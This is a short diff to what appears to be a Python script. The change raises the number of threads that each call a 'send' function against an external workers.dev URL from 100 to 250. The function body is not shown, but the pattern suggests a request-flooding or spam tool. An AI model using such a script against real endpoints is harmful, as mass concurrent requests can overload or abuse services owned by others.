@@ -19,7 +19,7 @@ def send(url):
 
 threads = []
 
-for ai in range(100):
+for ai in range(250):
     thread = threading.Thread(target=send, args=('https://send.loyojif372.workers.dev',))
     threads.append(thread)
     thread.start()
